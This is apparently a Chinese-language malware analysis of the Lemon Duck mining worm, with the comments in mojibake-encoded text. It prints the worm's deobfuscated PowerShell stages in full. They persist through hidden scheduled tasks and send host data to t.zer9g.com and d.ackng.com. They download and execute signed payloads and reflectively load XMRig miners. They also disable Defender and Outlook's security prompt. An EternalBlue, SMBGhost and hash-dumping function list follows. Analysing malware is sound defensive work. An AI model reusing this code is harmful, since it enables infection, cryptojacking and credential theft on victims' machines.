function getRan(){return -join([char[]](48..57+65..90+97..122)|Get-Random -Count (6+(Get-Random)%6))}
$us=@('t.awcna.com','t.zer9g.com','t.amynx.com')
$stsrv = New-Object -ComObject Schedule.Service
$stsrv.Connect()
# æŸ¥çœ‹æ˜¯å¦å·²ç»å­˜åœ¨åä¸ºblackballçš„å®šæ—¶ä»»åŠ¡
try{
	$doit=$stsrv.GetFolder("\").GetTask("blackball")
}catch{}
if(-not $doit){
	if($sa){
		schtasks /create /ru system /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"
	} else {
		schtasks /create /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"
	}
	foreach($u in $us){
		# è·å–åŸŸåä¸‹æ ‡
		$i = [array]::IndexOf($us,$u)
		# æ ¹æ®é™¤3ä½™æ•°ï¼Œé€‰æ‹©è®¡åˆ’ä»»åŠ¡å
		if($i%3 -eq 0){$tnf=''}
		if($i%3 -eq 1){$tnf=getRan}
		if($i%3 -eq 2){if($sa){$tnf='MicroSoft\Windows\'+(getRan)}else{$tnf=getRan}}
		$tn = getRan
		if($sa){
			# æ¯60åˆ†  æ‰§è¡Œå‘½ä»¤powershell PS_CMD  /F é˜»æ­¢ç³»ç»Ÿç¡®è®¤æ¶ˆæ¯
			schtasks /create /ru system /sc MINUTE /mo 60 /tn "$tnf\$tn" /F /tr "powershell -w hidden -c PS_CMD"
		} else {
			schtasks /create /sc MINUTE /mo 60 /tn "$tnf\$tn" /F /tr "powershell -w hidden -c PS_CMD"
		}
		start-sleep 1
		# è·å–æŒ‡å®šä½ç½®çš„å®šæ—¶ä»»åŠ¡
		$folder=$stsrv.GetFolder("\$tnf")
		# è·å–ééšè—ä»»åŠ¡ä»¥å¤–çš„æ‰€æœ‰ä»»åŠ¡
		$taskitem=$folder.GetTasks(1)
		foreach($task in $taskitem){
			foreach ($action in $task.Definition.Actions) {
				try{
					# è‹¥å‚æ•°ä¸­å­˜åœ¨PS_CMD
					if($action.Arguments.Contains("PS_CMD")){	
						# æ›¿æ¢ä¸ºæ”»å‡»æŒ‡ä»¤
						$folder.RegisterTask($task.Name, $task.Xml.replace("PS_CMD",$tmps.replace('U1',$u.substring(0,5)).replace('U2',$u.substring(5))), 4, $null, $null, 0, $null)|out-null
					}
				}catch{}
			}
		}
		schtasks /run /tn "$tnf\$tn"
		start-sleep 5
	}
}

# åˆ é™¤è€ç‰ˆæœ¬ä»»åŠ¡
schtasks /delete /tn Rtsa2 /F
schtasks /delete /tn Rtsa1 /F
schtasks /delete /tn Rtsa /F

```

åŠŸèƒ½ä¸Šè·Ÿä¸Šç‰ˆæœ¬çš„æ ·æœ¬ç›¸æ¯”ï¼ˆMD5=51f6eba99e2b33e5458d78e41a130fe2ï¼‰å»é™¤Hostæ–‡ä»¶å†™å…¥

æœ€ç»ˆå†™å…¥è®¡åˆ’ä»»åŠ¡çš„æ”»å‡»æŒ‡ä»¤ï¼š

```powershell
function a($u){
    $d=(New-Object Net.WebClient)."DownloadData"($u)
    $c=$d.count
    if($c -gt 173){$b=$d[173..$c]
    $p=New-Object Security.Cryptography.RSAParameters
    $p.Modulus=[convert]::FromBase64String('2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=')
    $p.Exponent=0x01,0x00,0x01
    $r=New-Object Security.Cryptography.RSACryptoServiceProvider
    $r.ImportParameters($p)
    if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){Iex(-join[char[]]$b)}}
}
$url='http://'+'t.zer'+'9g.com'
a($url+'/a.jsp?mail_20200603?'+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join'*'))

```

é€šè¿‡RSAæ ¡éªŒåè¯·æ±‚å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬`a.jsp`

PS: åœ¨ä¹‹å‰çš„æ´»åŠ¨ä¸­ï¼Œè®¡åˆ’ä»»åŠ¡å‘½åRtsaï¼ŒRtsa1ï¼ŒRtsa2ï¼ˆä¸ä¹‹å‰ä¸åŒçš„æ˜¯blueteaï¼Œblackballå‡ä¸å…·æœ‰å®é™…å‘½ä»¤æ‰§è¡Œï¼Œåªæ˜¯èµ·åˆ°Flagçš„ä½œç”¨ï¼Œé¿å…é‡å¤å†™å…¥è®¡åˆ’ä»»åŠ¡ï¼‰



#### a.jsp ï¼ˆæŒ–çŸ¿åŠä¼ æ’­ï¼‰

```
http://t.zer9g.com/a.jsp?<SYS ENV><RANDOM NUM>
(MD5 = 1540b9fe58b8279bd256aaad9d879fbe)
```

`a.jsp` çš„æ“ä½œå¤æ‚å¾ˆå¤šï¼Œä¸»è¦æ˜¯

åŠ è½½æ‰§è¡Œ `if.bin`è •è™«æ¨¡å—

æ ¹æ®ç³»ç»Ÿç¯å¢ƒé€‰æ‹©æ‰§è¡Œ`m6.bin` /`m6g.bin` æŒ–çŸ¿ç¨‹åºï¼Œåè€…å¯åˆ©ç”¨æ˜¾å¡åŠ é€Ÿï¼Œå¹¶ä¸‹è½½æ˜¾å¡æŒ–çŸ¿éœ€è¦çš„DLLæ–‡ä»¶

å…³é—­Outlookå®‰å…¨å‘Šè­¦ï¼ŒåŠ è½½æ‰§è¡Œ`if_mail.bin`

```powershell
# åˆ¤æ–­å½“å‰è¿è¡Œç¯å¢ƒ 64ä½/32ä½
if([IntPtr]::Size -eq 8){$is64=$true}
$ifbin="if.bin"
$ifmd5="45ef8d4faac68bd425bfdfe064602377"
if($is64){
	$mbin="m6.bin"
	$mmd5="5b2849ff2e8c335dcc60fd2155b2d4d3"
	$mgbin="m6g.bin"
	$mgmd5="23d59ed726e13edabcb751da7a5ce310"
}
# md5ç”Ÿæˆå‡½æ•°
function gmd5($d){
	[Security.Cryptography.MD5]::Create().ComputeHash($d)|foreach{$l+=$_.ToString('x2')}
	return $l
}
# æœ¬åœ°PayloadsMD5
$lifmd5,$lmmd5,$lmgmd5="","",""
try{
	$lifmd5=gmd5 ([IO.File]::ReadAllBytes("$env:tmp\$ifbin"))
}catch{}
try{
	$lmmd5=gmd5 ([IO.File]::ReadAllBytes("$env:tmp\$mbin"))
}catch{}
$down_url = "http://d.ackng.com"

# è·å–mail.jspå®šä¹‰çš„$url='http://'+'t.zer'+'9g.com'
$core_url = $url.split("/")[0..2]-join"/"
# ç®¡ç†å‘˜æƒé™åˆ¤å®š
$permit = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

# ç³»ç»Ÿä¿¡æ¯è·å–
$comp_name = $env:COMPUTERNAME
$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID
$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ $true}).Macaddress | select-object -first 1
$osb = (Get-WmiObject -class Win32_OperatingSystem)
# ç³»ç»Ÿç‰ˆæœ¬
$os = $osb.Caption.replace("Microsoft Windows ","")+"_"+$osb.Version
$user = $env:USERNAME
# åŸŸä¿¡æ¯è·å–
$domain = (Get-WmiObject win32_computersystem).Domain
# å¼€æœºæ—¶é—´
$uptime = [timespan]::FromMilliseconds([environment]::TickCount)|foreach{$_.totalseconds}
# æ˜¾å¡ä¿¡æ¯è·å–
$card = (Get-WmiObject Win32_VideoController).name
# è·å–å†…å­˜ä¿¡æ¯
gwmi Win32_PhysicalMemory | %{$msum = 0} { $msum += $_.Capacity };
$mem=$msum/1Gb
# è·å–æ»¡è¶³æ¡ä»¶çš„å­˜å‚¨ç›˜ä¿¡æ¯
try{
	$drive = ([system.IO.DriveInfo]::GetDrives() | where {$_.IsReady -and ($_.AvailableFreeSpace -gt 1024) -and (($_.DriveType -eq "Removable") -or ($_.DriveType -eq "Network")) -and (($_.DriveFormat -eq "NTFS") -or ($_.DriveFormat -eq "FAT32"))} | foreach{($_.Name)[0]+"_"+($_.DriveType.tostring())[0]})-join"|"
}catch{}

$timestamp = (Get-Date -UFormat "%s").Substring(0,9)
# XMRigçŸ¿å·¥ä¿¡æ¯
try{
	[Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions")
	$obj = (New-Object Web.Script.Serialization.JavaScriptSerializer).DeserializeObject((new-object net.webclient)."downloadstring"('http://127.0.0.1:43669/1/summary'))
	$mv=$obj.version
	$mip=$obj.connection.ip
	$mhr=$obj.hashrate.total-join(',')
}catch{}
# å…³é—­windows Defenderçš„å®æ—¶æ£€æµ‹
try{
	Set-MpPreference -DisableRealtimeMonitoring $true
	Add-MpPreference -ExclusionPath c:\
	Add-MpPreference -ExclusionProcess c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
}catch{}

if(($card -match "GTX|NVIDIA|GEFORCE")){$isn=1}
if(($card -match "Radeon|AMD")){$isa=1}
$params=@($comp_name,$guid,$mac)-join"&"
set-location $env:tmp
# è°ƒç”¨cmdæ‰§è¡Œå‘½ä»¤çš„å‡½æ•°
function stp($gra){
	Start-Process -FilePath cmd.exe -ArgumentList "/c $gra"
}

# æäº¤æœ¬åœ°ä¿¡æ¯$comp_name,$guid,$macå¹¶ä¸‹è½½/è¿è¡ŒæŒ‡å®šæ–‡ä»¶å¹¶æ ¡éªŒå…¶MD5
function gcf($code,$md,$fn){
	'powershell -c "'+$code+';$ifmd5='''+$md+''';$ifp=$env:tmp+''\'+$fn+''';$down_url='''+$down_url+''';function gmd5($con){[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{$s+=$_.ToString(''x2'')};return $s}if(test-path $ifp){$con_=[System.IO.File]::ReadAllBytes($ifp);$md5_=gmd5 $con_;if($md5_-eq$ifmd5){$noup=1}}if(!$noup){$con=(New-Object Net.WebClient)."downloaddata"($down_url+''/'+$fn+'?'+$params+''');$t=gmd5 $con;if($t-eq$ifmd5){[System.IO.File]::WriteAllBytes($ifp,$con)}else{$noup=1}}if($noup){$con=$con_;$ifmd5=$md5_}'
}
#  ä¸ä¸Šä¸ªç‰ˆæœ¬ä¹‹å‰çš„åŒºåˆ«åœ¨äº ç”Ÿæˆfnam.exe.oriæ–‡ä»¶  æ‹·è´ä¸º $fnam.bin.exe å¹¶åœ¨CMDåå°æ‰§è¡Œï¼Œä¹‹å‰æ˜¯start-process 

# åå°„å¼åŠ è½½è¿è¡Œä¸‹è½½çš„æ–‡ä»¶
function gpa($fnam){
	'for($i=0;$i -lt $con.count-1;$i+=1){if($con[$i] -eq 0x0a){break}};iex(-join[char[]]$con[0..$i]);$bin=(New-Object IO.BinaryReader(New-Object System.IO.Compression.GzipStream (New-Object System.IO.MemoryStream(,$con[($i+1)..($con.count)])), ([IO.Compression.CompressionMode]::Decompress))).ReadBytes(10000000);$bin_=$bin.Clone();$mep=$env:tmp+'''+"\$fnam.exe.ori"+''';[System.IO.File]::WriteAllBytes($mep,$bin_+((1..127)|Get-Random -Count 100));test1 -PEBytes $bin"'+"&copy /y %tmp%\$fnam.exe.ori %tmp%\$fnam.bin.exe & %tmp%\$fnam.bin.exe"
}

# åˆ¤å®š/è·å–ç‰¹å®šäº’æ–¥é”æ˜¯å¦å­˜åœ¨
# try{
# 	$localIf=$flase;
#	# åˆ›å»ºåä¸ºGlobal\eLocalIfçš„é”,å¦‚æœæœ‰ä¸å†åˆ›å»º
# 	New-Object Threading.Mutex($true,'Global\eLocalIf',[ref]$localIf);
# }catch{}
function gcode($fl) {
	'try{$local'+$fl+'=$flase;New-Object Threading.Mutex($true,''Global\eLocal'+$fl+''',[ref]$local'+$fl+')}catch{}'
}

$code1=gcode "If"
IEx $code1

# å¦‚æœæ˜¯æ–°åˆ›å»ºçš„Global\eLocalIfåˆ™è¿è¡Œ
# $ifp=$env:tmp+'\if.bin';
# $down_url='http://d.ackng.com';
# function gmd5($con){
#     [System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{
#         $s+=$_.ToString('X2')
#         };
#     return $s
# }
# # æ˜¯å¦å­˜åœ¨if.binï¼Œå­˜åœ¨åˆ™è¯»å–ï¼Œå¹¶è¿›è¡ŒMD5æ ¡éªŒ
# if(test-path $ifp){
#     $con_=[System.IO.File]::ReadAllBytes($ifp);
#     $md5_=gmd5 $con_;
#     if($md5_-eq$ifmd5){
#         $noup=1
#     }
# }
# # è‹¥æ²¡æœ‰é€šè¿‡MD5,æˆ–æ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¸‹è½½
# if(!$noup){
#     # http://d.ackng.com/if.bin?
#     $con=(New-Object Net.WebClient)."downloaddata"($down_url+'/if.bin?');
#     $t=gmd5 $con;
#     if($t-eq$ifmd5){
#         [System.IO.File]::WriteAllBytes($ifp,$con)
#     }else{$noup=1}
# }
# if($noup){
#     $con=$con_;
#     $ifmd5=$md5_
# }
# # è¿™é‡Œæœ‰ä¸ªå°ç»†èŠ‚ï¼Œè‹¥æœºå™¨ä¸Šæ²¡æœ‰if.binä¸”ä¸‹è½½çš„if.binæ²¡æœ‰é€šè¿‡MD5æ ¡éªŒçš„åˆ™ä¸ä¼šæ‰§è¡Œå…¶åŒ…å«çš„å‘½ä»¤
# IEX(-join[char[]]$con)
if($localIf){
	stp ((gcf $code1 $ifmd5 $ifbin)+'IEX(-join[char[]]$con)"')
}

# ç”¨å¤šå‡½æ•°æ‹¼æ¥ç”Ÿæˆè¯­å¥ï¼Œé€ƒé¿æ£€æµ‹
# é’ˆå¯¹64ä½ç³»ç»Ÿ
if($is64){
	# try{
	# 	$localMn=$flase;
	# 	New-Object Threading.Mutex($true,'Global\eLocalMn',[ref]$localMn)
	# }catch{}
	$code2=gcode "Mn"
	IEx $code2
	if($localMn){
		# $ifmd5='5b2849ff2e8c335dcc60fd2155b2d4d3';
		# $ifp=$env:tmp+'\m6.bin';
		# $down_url='http://d.ackng.com';
		# function gmd5($con){
		# 	[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{
		# 		$s+=$_.ToString('X2')};
		# 	return $s
		# }

		# if(test-path $ifp){
		# 	$con_=[System.IO.File]::ReadAllBytes($ifp);
		# 	$md5_=gmd5 $con_;
		# 	if($md5_-eq$ifmd5){
		# 		$noup=1
		# 	}
		# }
		# if(!$noup) {
		# 	# http://d.ackng.com/m6.bin?
		# 	$con=(New-Object Net.WebClient)."downloaddata"($down_url+'/m6.bin?');
		# 	$t=gmd5 $con;
		# 	if($t-eq$ifmd5){
		# 		[System.IO.File]::WriteAllBytes($ifp,$con)
		# 	}
		# 	else{
		# 		$noup=1
		# 	}
		# }
		# if($noup){
		# 	$con=$con_;
		# 	$ifmd5=$md5_
		# }

		# ### ä»¥ä¸‹æ˜¯gpaå‡½æ•°ç”Ÿæˆçš„ä»£ç 
		# for($i=0;$i -lt $con.count-1;$i+=1){
		# 	if($con[$i] -eq 0x0a){
		# 		break
		# 	}
		# }
		# # ä»¥0x0Aæˆªæ–­æ–‡ä»¶ ï¼Œæ‰§è¡Œå‰åŠéƒ¨åˆ†ï¼Œå®šä¹‰test1å‡½æ•° 
		# iex(-join[char[]]$con[0..$i]);

		# $bin=(New-Object IO.BinaryReader(New-Object System.IO.Compression.GzipStream (New-Object System.IO.MemoryStream(,$con[($i+1)..($con.count)])), ([IO.Compression.CompressionMode]::Decompress))).ReadBytes(10000000);
		# $bin_=$bin.Clone();
		# test1 -PEBytes $bin;
		# $mep=$env:tmp+'\m6.bin.exe';
		# # åœ¨æŒ–çŸ¿ç¨‹åºåè¿½åŠ éšæœºå­—èŠ‚ï¼Œä¿å­˜
		# [System.IO.File]::WriteAllBytes($mep,$bin_+((1..127)|Get-Random -Count 100));
		# # è¿è¡Œä¸Šä¸€æ­¥ç”Ÿæˆçš„ç¨‹åº
		# start-process -FilePath $mep
		stp ((gcf $code2 $mmd5 $mbin)+(gpa $mbin))
	}
}
if(($isn -or $isa) -and $is64){
	$code3=gcode "Mng"
	# try{
	# 	$localMng=$flase;
	# 	New-Object Threading.Mutex ($true,'Global\eLocalMng',[ref]$localMng)
	# }catch{ }
	IEx $code3
	if($localMng){
		stp ((gcf $code3 $mgmd5 $mgbin)+(gpa $mgbin))
	}
}
# ä¿®æ”¹DNS
try{
	(get-wmiobject -class win32_networkadapterconfiguration -filter ipenabled=true).SetDNSServerSearchOrder(@('8.8.8.8','9.9.9.9'))
}catch{}

# æºå¸¦ä¿¡æ¯ï¼š
# ç³»ç»Ÿï¼Œç³»ç»Ÿä½æ•°ï¼Œç”¨æˆ·ï¼ŒåŸŸï¼Œç£ç›˜ï¼Œæ˜¾å¡ï¼Œå†…å­˜ï¼Œç®¡ç†å‘˜æƒé™ï¼Œæœ¬åœ°è •è™«æ”»å‡»Payloadï¼Œæœ¬åœ°xmrigPayloadï¼Œxmrigç‰ˆæœ¬ï¼ŒçŸ¿æ± åœ°å€ï¼Œç®—åŠ›ï¼Œå¼€æœºæ—¶é—´ï¼Œä¸Šä¼ æ—¶é—´
$params+="&"+(@($os,[Int]$is64,$user,$domain,$drive,$card,$mem,[Int]$permit,($lifmd5[0..5]-join""),($lmmd5[0..5]-join""),$mv,$mip,$mhr,$uptime,$timestamp,"0.1")-join"&")
# è¿›è¡ŒRSAç­¾åæ ¡éªŒåæ‰§è¡Œ
function SIEX {  
	Param(
	[string]$url
	)
	try{
		$webclient = New-Object Net.WebClient
		$finalurl = "$url"+"?"+"$params"
		try{
			$webclient.Headers.add("User-Agent","Lemon-Duck-"+$Lemon_Duck.replace('\','-'))
		} catch{}
		$res_bytes = $webclient."DownloadData"($finalurl)
		if($res_bytes.count -gt 173){
			$sign_bytes = $res_bytes[0..171];
			$raw_bytes = $res_bytes[173..$res_bytes.count];
			$rsaParams = New-Object System.Security.Cryptography.RSAParameters
			# å…¬é’¥ 	2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0 M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=
			$rsaParams.Modulus = 0xda,0x65,0xa8,0xd7,0xbb,0x97,0xbc,0x6d,0x41,0x5e,0x99,0x9d,0x82,0xff,0x2f,0xff,0x73,0x53,0x9a,0x73,0x6e,0x6c,0x7b,0x55,0xeb,0x67,0xd6,0xae,0x4e,0x23,0x3c,0x52,0x3d,0xc0,0xcd,0xcd,0x37,0x6b,0xf3,0x4f,0x3b,0x62,0x70,0x86,0x07,0x96,0x6e,0xca,0xde,0xbd,0xa6,0x4f,0xf6,0x11,0xd1,0x60,0xdc,0x88,0xbf,0x35,0xf2,0x92,0xee,0x6c,0xb8,0x2e,0x9b,0x7d,0x2b,0xd1,0x19,0x30,0x73,0xc6,0x52,0x01,0xcd,0xe7,0xc7,0x34,0x78,0x8a,0xa7,0x9f,0xe2,0x12,0xcd,0x79,0x40,0xa7,0x91,0x6a,0xae,0x95,0x8e,0x42,0xd0,0xcf,0x39,0x6e,0x30,0xcb,0x0a,0x98,0xdb,0x97,0x3f,0xf6,0x2e,0x95,0x10,0x72,0xfd,0x63,0xd5,0xf7,0x88,0x63,0xa4,0x7b,0xae,0x97,0xea,0x38,0xb7,0x47,0x6b,0x5d
			$rsaParams.Exponent = 0x01,0x00,0x01
			$rsa = New-Object -TypeName System.Security.Cryptography.RSACryptoServiceProvider;
			$rsa.ImportParameters($rsaParams)
			$base64 = -join([char[]]$sign_bytes)
			$byteArray = [convert]::FromBase64String($base64)
			$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
			if($rsa.verifyData($raw_bytes,$sha1,$byteArray)) {
				IEX (-join[char[]]$raw_bytes)
			}
		}
	} catch{}
}
SIEX "$core_url/report.jsp"
# flagæ–‡ä»¶ (0kb)
$ff=$env:tmp+'\GkPiGedjuq8f91j.txt'
# ffæ˜¯å¦å­˜åœ¨
if(!(Test-Path $ff)){
	## æ‰“å¼€é˜²æŠ¤å¢™è®¾ç½®DNSç«¯å£è½¬å‘
	cmd.exe /c netsh.exe firewall add portopening tcp 65529 SDNSd
	netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53
	cmd.exe /c netsh.exe firewall add portopening tcp 65533 DNSd
	netsh.exe interface portproxy add v4tov4 listenport=65533 connectaddress=1.1.1.1 connectport=53
	# ç¦æ­¢445ï¼Œ135çš„è®¿é—®
	netsh advfirewall firewall add rule name="deny445" dir=in protocol=tcp localport=445 action=block
	netsh advfirewall firewall add rule name="deny135" dir=in protocol=tcp localport=135 action=block
	new-item $ff -type file
}
# è‹±ä¼Ÿè¾¾æ˜¾å¡ä¸”64ä½ç³»ç»Ÿï¼Œä¼šä¸‹è½½æ˜¾å¡åŠ é€ŸæŒ–çŸ¿æ’ä»¶
try{
	if($isn -and $is64){
		$nd="nvd.zip"
		$ndg="$env:tmp\nvdg.dat"
		if(!(test-path $ndg) -or (Get-Item $ndg).length -ne 18475008){
			(new-object Net.WebClient)."DownloadFile"($down_url+"/$nd","$env:tmp\$nd")
			(New-Object -ComObject Shell.Application).NameSpace($env:tmp).CopyHere("$env:tmp\$nd\*",16)
			Remove-Item $env:tmp\$nd
		}
	}
}catch{}

# å…³é—­Outlookçš„å®‰å…¨å‘Šè­¦ 
# å½“ç¨‹åºå°è¯•è®¿é—®æ‚¨çš„Outlookå®¢æˆ·ç«¯ä»¥ä»£è¡¨æ‚¨å‘é€ç”µå­é‚®ä»¶ï¼Œå¹¶ä¸”æ£€æµ‹åˆ°æ‚¨çš„é˜²ç—…æ¯’è½¯ä»¶å¤„äºéæ´»åŠ¨çŠ¶æ€æˆ–è¿‡æœŸæ—¶ï¼Œå°†æ˜¾ç¤ºæ­¤è­¦å‘Šæ¶ˆæ¯ã€‚

$hks="HKEY_LOCAL_MACHINE\SOFTWARE\"
$mso="Microsoft\Office"
$wnd="Wow6432Node\"
$crm="ClickToRun\REGISTRY\MACHINE\Software\"
$paths=@("$hks$mso","$hks$wnd$mso","$hks$mso\$crm$mso","$hks$mso\$crm$wnd$mso")

# åœ¨32ä½Windowsä¸Šè¿è¡Œçš„32ä½Officeæˆ–åœ¨64ä½Windowsä¸Šè¿è¡Œçš„64ä½Office
# Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office
# åœ¨64ä½Windowsä¸Šè¿è¡Œçš„32ä½Office 
# Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Office 
# é’ˆå¯¹å³ç‚¹å³ç”¨çš„Officeç‰ˆæœ¬
# Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun\REGISTRY\MACHINE\Software\Microsoft\Office
# Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun\REGISTRY\MACHINE\Software\Wow6432Node\Microsoft\Office
foreach($path in $paths){
	if(test-path Registry::$path){
		get-childitem Registry::$path -name|where-object{$_ -match "\d+" -and (Test-Path Registry::$path\$_\Outlook)}|foreach{
			$skey="Registry::$path\$_\Outlook\Security"
			if(!(Test-Path $skey)){
				New-Item $skey
			}
			Set-ItemProperty $skey ObjectModelGuard 2 -type Dword
			$mflag=test-path $skey
	}}
}
# å…³é—­å‘Šè­¦ä¹‹å
if($mflag){
	try{
		$localMail=$flase;
		New-Object Threading.Mutex($true,'Global\LocalMail',[ref]$localMail)
	}catch{}
	if($localMail){
		if(!(test-path $env:tmp\godmali3.txt)){
			SIEX "$down_url/if_mail.bin"
		}
	}
}
```

å…¶æ‰§è¡Œè¿‡ç¨‹ä¸­å¼€å¯çš„æœ¬åœ°DNSè½¬å‘æˆªå›¾ï¼š

<img src="./README.assets/20200611image-20200428151458545.png" alt="image-20200428151458545" style="zoom:50%;" />





##### if.binï¼ˆä¸»è¦æ”»å‡»æ¨¡å—ï¼‰

æ ¹æ®ç³»ç»Ÿç¯å¢ƒä¸­çš„å…¨å±€äº’æ–¥é” `Global\eLocalIf`ä¸‹è½½ï¼š

```
http://d.ackng.com/if.bin?
MD5 (if.bin) = df5c8f7677a3361d17cc1ba820436ce9
```

æœ‰ä¸ªç»†èŠ‚å€¼å¾—æ³¨æ„ï¼š

è‹¥æœºå™¨ä¸Šæ²¡æœ‰if.binä¸”ä¸‹è½½çš„if.binæ²¡æœ‰é€šè¿‡MD5æ ¡éªŒï¼ˆc2fcf4ebba3fbfa1fc4c82e728137076ï¼‰

åˆ™ä¸€å¼€å§‹ä¸ä¼šç›´æ¥æ‰§è¡Œif.binä¸­åŒ…å«çš„å‘½ä»¤

åœ¨è°ƒæŸ¥æœŸé—´ifbinå·²ç»æ›´æ–°åäºŒæ¬¡ä¹‹å¤šï¼š

```spreadsheet
if.bin MD5 "00d1474b36d8f9daed96334d95749861"
if.bin MD5 "2c2ce2150f73a4df14b0e83581f68af3"
if.bin MD5 "3053160f2072509f2e167f1e82c7b539"
if.bin MD5 "45ef8d4faac68bd425bfdfe064602377"
if.bin MD5 "54bf14b942f61a878b26d5b844ad5ae0"
if.bin MD5 "6a9c39d88715c5262b34a68cea4fa331"
if.bin MD5 "74eea0ef800d170d79ef7d66c6a97709"
if.bin MD5 "b5ee1e46de1f709e778c4a53a79c767d"
if.bin MD5 "c2fcf4ebba3fbfa1fc4c82e728137076"
if.bin MD5 "def23ff364e25f64342f39d3f64d5aeb"
if.bin MD5 "df8679bded63cb99fd3bed16bf5a4397"
if.bin MD5 "e5ae6d154a6befc00deea0ccb49dc9b8"
```

if.binå­˜åœ¨å¤šæ¬¡æ··æ·†åŠ å¯†ï¼Œé€šè¿‡é€†å‘æœ€ç»ˆå¾—åˆ°ä¸€ä¸ªé•¿è¾¾1ä¸‡å¤šè¡Œçš„powershellè„šæœ¬ï¼Œå®šä¹‰å¤šè¾¾ä¸€ç™¾ä¸ƒåå¤šä¸ªå‡½æ•°ï¼Œæ¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨

åŒ…å«ä»¥ä¸‹æ”»å‡»ï¼š

-   ç«¯å£æ‰«æ
-   EternalBlue/MS17-010  é’ˆå¯¹Win7/Win8
-   æš´åŠ›ç ´è§£ï¼Œå‘½ä»¤æ‰§è¡Œï¼ˆé™¤è‡ªèº«æºå¸¦å­—å…¸å¤–ï¼Œè¿˜ä¼šå°†è·å–æœ¬åœ°å£ä»¤/å‡­è¯åŠ å…¥å­—å…¸ï¼‰ï¼š
    -   $IPC
    -   SMB
    -   MS-SQL
    -   RDP
    -   NTLM
    -   SSHï¼ˆ2020-06-01æ–°å¢ï¼Œé’ˆå¯¹Linux rootè´¦å·ï¼‰
    -   WMI
-   CVE-2017-8464 
-   CVE-2020-0796 SMBGhost (2020å¹´4æœˆæ–°å¢ï¼Œæ¼æ´åœ¨3æœˆæ‰æŠ«éœ²)

å…¶ä¸­åŒ…å«å‡½æ•°ï¼ˆç§°ä¹‹ä¸ºå†›ç«åº“ä¸ä¸ºè¿‡ï¼‰

```powershell
function make_smb1_anonymous_login_packet 
function smb1_anonymous_login
function negotiate_proto_request
function smb_header
function smb1_get_response
function client_negotiate
function tree_connect_andx
function tree_connect_andx_request
function smb1_anonymous_connect_ipc
function make_smb1_nt_trans_packet
function make_smb1_trans2_exploit_packet
function make_smb1_trans2_last_packet
function send_big_trans2
function createSessionAllocNonPaged
function make_smb1_free_hole_session_packet
function smb2_grooms
function make_smb2_payload_headers_packet
function eb7
function createFakeSrvNetBuffer8
function createFeaList8
function  make_smb1_login8_packet8 
function  make_ntlm_auth_packet8
function smb1_login8
function negotiate_proto_request8
function smb_header8
function smb1_get_response8
function client_negotiate8
function tree_connect_andx8
function tree_connect_andx8_request
function make_smb1_nt_trans_packet8
function make_smb1_trans2_exploit_packet8
function send_big_trans28
function createSessionAllocNonPaged8
function  make_smb1_free_hole_session_packet8
function make_smb2_payload_headers_packet8
function eb8
function Invoke-Myrdp
	function rdp_send
	function rdp_recv
	function rdp_send_recv
	function bytes_to_bignum
	function output
	function rdp_parse_serverdata
	function check_rdp
	function unpack
	function pdu_connect_initial
	function pdu_erect_domain_request
	function pdu_attach_user_request
	function pdu_channel_request
	function rsa_encrypt
	function pdu_security_exchange
	function pdu_client_info
	function pdu_client_confirm_active
	function pdu_client_persistent_key_list
	function rdp_salted_hash
	function rdp_hmac
	function rdp_rc4_crypt
	function rdp_final_hash
	function rdp_calculate_rc4_keys
	function rdp_encrypted_pkt
	function try_check
	function check
function geth 
function LoadApi
function sid_to_key
function str_to_key
function NewRC4
function des_encrypt
function des_decrypt
function des_transform
function Get-RegKeyClass
function Get-BootKey
function Get-HBootKey
function Get-UserName
function Get-UserHashes
function DecryptHashes
function DecryptSingleHash
function Get-UserKeys
function DumpHashes
function Invoke-Mypass
    function LGDJSR
    function Get-WiSDGKDants
    function Get-l64ftion
    function bud-ksgLHDnwn
    function Add-SignedIntAsUnsigned
    function Compare-Val1GreaterThanVal2AsUInt
    function Convert-UIntToInt
    function Test-MemoryRangeValid
    function Write-BytesToMemory
    function Get-DelegateType
    function klsdjlkhfDjswpdy
    function Enable-SeDebugPrivilege
    function sadkjhdsjD
    function Get-ImageNtHeaders
    function DHWE-kidD
    function KDHSD-JUWF
    function HDSK-OUHF
    function KJSHDeUFHEF7
    function Cthis-SectioDSns
    function LSHDjh3-upd
    function lhsdu-jsd
    function SDhk34JSD
    function usdKdhdf
    function KSHDUWKHF
    function SDHlhuhWEDSDDS
    function GessKUDBSD
    function LHSDGUKsdHF
    function SDLHLESDME
    function Main
function Invoke-SE
function ConvertFrom-PacketOrderedDictionary
function New-PacketNetBIOSSessionService
